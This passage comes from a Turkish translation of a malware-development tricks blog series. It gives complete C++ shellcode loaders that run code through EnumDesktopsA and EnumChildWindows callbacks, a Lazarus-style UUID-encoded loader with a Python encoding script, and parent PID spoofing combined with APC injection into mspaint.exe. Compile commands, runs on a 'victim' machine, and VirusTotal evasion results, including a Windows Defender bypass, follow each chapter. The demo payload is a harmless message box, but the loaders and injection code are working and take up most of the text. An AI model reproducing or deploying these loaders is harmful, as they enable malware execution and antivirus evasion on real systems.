	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {
	LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(mem, my_payload, sizeof(my_payload));
	EnumDesktopsA(GetProcessWindowStation(),
	(DESKTOPENUMPROCA)mem, NULL);
	return 0;
}

Gördüğünüz gibi, ilk olarak VirtualAlloc kullanarak mevcut işlemde bir bellek tamponu ayırıyoruz:
LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Daha sonra payload'umuzu bu bellek bölgesine 'kopyalıyoruz':
RtlMoveMemory(mem, my_payload, sizeof(my_payload));
Ve ardından, EnumDesktopsA işlevindeki geri çağırma işlevine işaretçi olarak bu bellek bölgesini belirtiyoruz:
EnumDesktopsA(GetProcessWindowStation(),
(DESKTOPENUMPROCA)mem, NULL);

Her zamanki gibi, basitlik adına meow-meow mesaj kutusu payload'unu kullandım:

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
Demo
Şimdi her şeyi eylemde görelim. Zararlı yazılımımızı derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++

Ve kurbanın makinesinde çalıştırıyoruz:
.\hack.exe

++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)

Şimdi `hack.exe` dosyamızı VirusTotal'a yükleyelim:

++++++++++++++++++++++++++++++++

Sonuç olarak, 66 antivirüs motorundan 16 tanesi dosyamızı zararlı olarak algıladı.
https://www.virustotal.com/gui/file/657ff9b6499f8eed373ac61bf8fc98257295869a
833155f68b4d68bb6e565ca1/detection

Ve ilginç olan şu ki, bu numara Windows Defender'ı atlattı. 
++++++++++++++++++++++++++++++++

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.

EnumDesktopsA(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumdesktopsa)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-06-27-malware-injection-20

34. Zararlı Yazılım Geliştirme Tüyoları. EnumChildWindows Kullanarak Shellcode Çalıştırma. C++ Örneği.
﷽
++++++++++++++++++++++++++++++++

Bu bölüm, alt pencereleri listeleyerek shellcode çalıştırmak üzerine yaptığım araştırmaların bir sonucudur.

EnumChildWindows
Alt pencerelerin tanıtıcısını, uygulama tarafından oluşturulan bir geri çağırma işlevine sağlayarak, belirtilen ana pencerenin alt pencerelerini listeler.  
EnumChildWindows, ya son alt pencere listelenene ya da geri çağırma işlevi FALSE döndürene kadar devam eder:  
BOOL EnumChildWindows(
HWND hWndParent,
WNDENUMPROC lpEnumFunc,
LPARAM lParam
);

Pratik Örnek  
Hadi, pratik bir örneğe bakalım. Bu numara oldukça basit ve önceki numaralara benzer:  
/*
* hack.cpp - run shellcode via EnumChildWindows.
C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/malware/
2022/07/13/malware-injection-21.html
*/
#include <windows.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {

	LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(mem, my_payload, sizeof(my_payload));
	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
	return 0;
}

İlk olarak, VirtualAlloc kullanarak mevcut işlemde bir bellek tamponu ayırıyoruz:  

LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
MEM_COMMIT, PAGE_EXECUTE_READWRITE);

Daha sonra payload'umuzu bu bellek bölgesine 'kopyalıyoruz':

RtlMoveMemory(mem, my_payload, sizeof(my_payload));

Daha sonra, EnumChildWindows işlevindeki geri çağırma işlevine işaretçi olarak bu bellek bölgesini belirtiyoruz:  

EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

Her zamanki gibi, basitlik adına meow-meow mesaj kutusu payload'unu kullandım:  

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";

Demo

Her şeyi eylemde görelim. Zararlı yazılımımızı derleyelim:  

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++

Ve kurbanın makinesinde çalıştırıyoruz:  

.\hack.exe
++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)  

Şimdi hack.exe dosyamızı VirusTotal'a yükleyelim: 
 
++++++++++++++++++++++++++++++++

Sonuç olarak, 69 antivirüs motorundan 20 tanesi dosyamızı zararlı olarak algıladı.  

https://www.virustotal.com/gui/file/71c4294f90d6d6c3686601b519c2401a58bb1fb0
3ab9ca3975eca7231af77853/detection

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.  

EnumChildWindows(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumchildwindows)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-07-13-malware-injection-21

35. Zararlı Yazılım Geliştirme Tüyoları. Lazarus Group Tarzı Shellcode Çalıştırma. C++ Örneği.

﷽

++++++++++++++++++++++++++++++++

Bu yazı, başka bir ilginç numara üzerine yaptığım araştırmaların bir sonucudur: UuidFromStringA ve EnumChildWindows kullanarak payload çalıştırma.

UuidFromStringA 

Bu işlev, bir dizeyi UUID'ye dönüştürür:  
RPC_STATUS UuidFromStringA(
RPC_CSTR StringUuid,
UUID *Uuid
);

Standard memcpy veya WriteProcessMemory işlevlerini kullanmadan, bu işlev verileri çözmek ve belleğe yazmak için kullanılabilir.  

Shellcode çalıştırma tekniği şu adımlardan oluşur:  
	- Bellek tahsisi (VirtualAlloc)  
	- UuidFromStringA kullanarak UUID dizilerini ikili formata dönüştürüp belleğe kaydetme  
	- EnumChildWindows (veya EnumDesktopsA ya da başka bir aday) kullanarak belleğe yüklenen payload'u yürütme  

Pratik Örnek

Hadi, pratik bir örneğe bakalım. Bu numara oldukça basit ve önceki numaralara benzer, ancak Lazarus Group'a özgü bazı değişiklikler içerir.  

İlk olarak, istediğimiz payload'u UUID geçerli dizelere dönüştürmek için bir betiğe ihtiyacımız var. Örneğin payload_uuid.py:  

#!usr/bin/python3

from uuid import UUID
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-p','--payload', required = True, help = "payload: binary file")
args = vars(parser.parse_args())
pbin = args['payload']

with open(pbin, "rb") as f:
	# read in 16 bytes from our input payload
	chunk = f.read(16)
	while chunk:
		# if the chunk is less than 16 bytes then we pad the difference (x90)
		if len(chunk) < 16:
			padding = 16 - len(chunk)
			chunk = chunk + (b"\x90" * padding)
		print(UUID(bytes_le=chunk))
	chunk = f.read(16)

Her zamanki gibi, meow-meow mesaj kutusu payload'u (meow.bin) kullanacağım.  

Çalıştır:  

python3 payload_uuid.py -p meow.bin
++++++++++++++++++++++++++++++++

Artık payload'umuzu UUID formatında elde ettiğimize göre, aşağıdaki kodu test etmek için bir kavram kanıtı oluşturabiliriz:  
#include <windows.h>
#include <rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] = {
	"e48148fc-fff0-ffff-e8d0-000000415141",
	"56515250-3148-65d2-488b-52603e488b52",
	"8b483e18-2052-483e-8b72-503e480fb74a",
	"c9314d4a-3148-acc0-3c61-7c022c2041c1",
	"01410dc9-e2c1-52ed-4151-3e488b52203e",
	"483c428b-d001-8b3e-8088-0000004885c0",
	"01486f74-50d0-8b3e-4818-3e448b402049",
	"5ce3d001-ff48-3ec9-418b-34884801d64d",
	"3148c931-acc0-c141-c90d-4101c138e075",
	"034c3ef1-244c-4508-39d1-75d6583e448b",
	"01492440-66d0-413e-8b0c-483e448b401c",
	"3ed00149-8b41-8804-4801-d0415841585e",
	"58415a59-5941-5a41-4883-ec204152ffe0",
	"5a594158-483e-128b-e949-ffffff5d49c7",
	"000000c1-3e00-8d48-95fe-0000003e4c8d",
	"00010985-4800-c931-41ba-45835607ffd5",
	"41c93148-f0ba-a2b5-56ff-d54d656f772d",
	"776f656d-0021-5e3d-2e2e-5e3d00909090"
};

int main() {
	int elems = sizeof(uuids) / sizeof(uuids[0]);
	VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000,
	PAGE_EXECUTE_READWRITE);
	DWORD_PTR hptr = (DWORD_PTR)mem;
	for (int i = 0; i < elems; i++) {
		// printf("[*] Allocating %d of %d uuids\n", i + 1, elems);
		// printf("%s\n", *(uuids+i));
		RPC_CSTR rcp_cstr = (RPC_CSTR)*(uuids+i);
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
		if (status != RPC_S_OK) {
			printf("[-] UUID convert error\n");
			CloseHandle(mem);
			return-1;
		}
		hptr += 16;
	}
	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

	// EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
	CloseHandle(mem);
	return 0;
}

UuidFromStringA işlevine dikkat edin. Daha önce yazdığım gibi, bu API'yi bir UUID işaretçisi yerine bir bellek işaretçisi ile çağırmak, verilen UUID'nin ikili temsilinin bellekte saklanmasına neden olur.  

Birçok API isteğini zincirleyerek ve uygun şekilde tasarlanmış UUID'ler vererek, gerekli içeriği (payload) seçilen bellek bölgesine yüklemek mümkündür.  

Ve ardından, EnumChildWindows işlevindeki geri çağırma işlevine işaretçi olarak bu bellek bölgesini belirtiyoruz:  

EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

veya başka bir işlev EnumDesktopsA:  

EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

Demo

Her şeyi eylemde görmek için zararlı kodumuzu derleyelim:

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive -lrpcrt4

++++++++++++++++++++++++++++++++

ve kurbanın makinesinde çalıştıralım:

.\hack.exe

++++++++++++++++++++++++++++++++

Payload'umuzun gerçekten çalıştığından emin olmak için kodun bir kısmını biraz değiştirebilirsiniz:  

printf("[*] Hexdump: ");
for (int i = 0; i < elems*16; i++) {
	printf("%02X ", ((unsigned char*)mem)[i]);
}

Daha sonra tekrar derleyin:  

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive -lrpcrt4

++++++++++++++++++++++++++++++++

Ve tekrar çalıştırın:  

.\hack.exe

++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)  

Şimdi hack.exe dosyamızı VirusTotal'a yükleyelim:  
++++++++++++++++++++++++++++++++


Sonuç olarak, 68 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak algıladı.  

Bir sorun var.Lazarus Group, HeapCreate ve HeapAlloc işlevlerini kullanmayı tercih ediyor:

HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
void* mem = HeapAlloc(hc, 0, 0x100000);  

HeapAlloc, yığın belleği tahsis etmek için sık kullanılan bir API çağrısıdır.  
Bu API, bildiğim kadarıyla, VirtualAlloc API'si yerine yığından belirli miktarlarda bellek ayırmanıza olanak tanır. Ancak belgelerine göre, gerekirse HeapAlloc hala VirtualAlloc'u çağırabilir.  

Ayrıca bu API, o kadar şüpheli kabul edilmez.  

Lazarus Group ayrıca payload'u yürütmek için EnumSystemLocalesA işlevini kullanır.  

Umarım bu yazı, mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerine ilham olur.  

nccgroup - RIFT: Analysing a Lazarus Shellcode Execution Method(https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)
Lazarus Group(https://attack.mitre.org/groups/G0032/)
Github’taki kaynak kod: https://github.com/cocomelonc/meow/tree/master/2022-07-21-malware-tricks-22

36. Zararlı Yazılım Geliştirme Tüyoları. Parent PID Spoofing. Basit C++ Örneği.

﷽

++++++++++++++++++++++++++++++++

Bu makale, parent process ID spoofing üzerine yaptığım kendi araştırmalarımın bir sonucudur.

Parent PID Spoofing  

Parent ve child süreçler arasındaki ilişkileri izlemek, tehdit avı ekipleri tarafından kötü amaçlı etkinlikleri belirlemek için kullanılan yaygın bir yöntemdir. Kırmızı takım üyeleri, Parent PID Spoofing yöntemini bir kaçış yöntemi olarak benimsemiştir.  CreateProcess Windows API çağrısı, Parent PID'yi belirlemenize olanak tanıyan bir parametreyi destekler.  
Bu, kötü amaçlı bir işlemin oluşturulduğunda çalıştırılan işlemden farklı bir parent kullanabileceği anlamına gelir.  

Pratik Örnek

Hadi pratik bir örneğe bakalım. İlk olarak, diyelim ki elimizde bir süreç var, örneğin mspaint.exe:


++++++++++++++++++++++++++++++++

PID'sinin 3396 olduğunu görebilirsiniz. Parent süreci (PID: 2876) explorer.exe'dir:  

 ++++++++++++++++++++++++++++++++

Process Hacker kullanarak, mevcut dizinin C:\Windows\System32 olduğunu da görebiliriz:  

++++++++++++++++++++++++++++++++

Bu numaranın yürütme akışı şu adımları içerir:  
- explorer.exe PID'sini aldım: 

int pid = findMyProc(argv[1]);
if (pid) {
	printf("PID = %d\n", pid);
}

HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid); 

Mspaint.exe sürecini oluşturalım:

CreateProcessA("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, TRUE,
CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000,
MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

Oluşturulan süreç belleğine meow-meow payload'unu yazın:

BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload, sizeof(my_payload), nb);

Oluşturulan işlemin iş parçacığına, APC kuyruğuna bir kullanıcı modu asenkron işlem çağrısı (APC) nesnesi ekleyin:  

QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);

İş parçacığını devam ettirin:  

ResumeThread(pi.hThread);
CloseHandle(pi.hThread);

Tam kaynak kod:
/*
hack.cpp
parent PID spoofing with APC
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html
*/
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int findMyProc(const char *procname) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {
	unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";

	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T st;
	int pid = findMyProc(argv[1]);
	if (pid) {
		printf("PID = %d\n", pid);
	}

	HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid);

	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	InitializeProcThreadAttributeList(NULL, 1, 0, &st);
	si.lpAttributeList =
	(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, st);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &st);
	UpdateProcThreadAttribute(si.lpAttributeList, 0,
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	CreateProcessA("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, TRUE,
CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL,
	NULL, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
	LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_RESERVE |
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	SIZE_T *nb = 0;
	BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload,
	sizeof(my_payload), nb);
	QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	return 0;
}  

Gördüğünüz gibi, önceki gönderilerimden kodu yeniden kullandım.  
Burada, başlatılan süreci biraz sabitledim; bunu komut satırı parametrelerinden alacak şekilde değiştirebilirsiniz.  

Demo

Kodumuzu derleyelim: 

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-mwindows -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++

kurbanın makinesinde çalıştıralım:  

.\hack.exe explorer.exe

++++++++++++++++++++++++++++++++

Process Hacker'ı çalıştırın ve görebileceğiniz gibi, mspaint.exe süreci başarıyla oluşturuldu (PID: 4720):  

++++++++++++++++++++++++++++++++

Ve:  
++++++++++++++++++++++++++++++++

++++++++++++++++++++++++++++++++


Gördüğünüz gibi, parent süreç 2876, bu explorer.exe'ye karşılık geliyor, ancak mevcut dizin Z:\2022-09-06-malware-tricks-23!  

Ve süreç belleğinde ne olduğuna bakalım:

++++++++++++++++++++++++++++++++

Her şey mükemmel bir şekilde çalıştı :)  

Aslında sizi biraz kandırdım. Örneğimde sadece parent süreç spoofing yapılmadı. 
Bu, PPID spoofing ve APC enjeksiyonunun bir kombinasyonudur. Çünkü ben de sizin gibi yeni şeyler öğreniyorum ve bazen kendinize sorular sormaktan ve denemekten korkmamalısınız.  

Şimdi hack.exe dosyamızı VirusTotal'a yükleyelim:

++++++++++++++++++++++++++++++++

Sonuç olarak, 70 antivirüs motorundan 20 tanesi dosyamızı zararlı olarak algıladı.  

https://www.virustotal.com/gui/file/3ec9f1080253f07695f0958ae84e99ff065f052c
409f0f7e3e1a79cd4385a9d5/detection

Bu teknik, Cobalt Strike ve KONNI RAT tarafından kullanılır.  
Örneğin, Cobalt Strike alternatif PPID'lerle süreçler başlatabilir.  

Bu teknik, ilk olarak 2009'da Didier Stevens tarafından daha geniş bilgi güvenliği topluluğuna tanıtıldı.  

Umarım bu yazı, mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler. 

Didier Stevens: That Is Not My Child Process!( https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/)
MITRE ATT&CK: Parent PID spoofing(https://attack.mitre.org/techniques/T1134/004/)
Cobalt Strike(https://attack.mitre.org/software/S0154/)
KONNI(https://attack.mitre.org/software/S0356/)
CreateProcessA(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
Find process ID by name and inject to it(https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html)
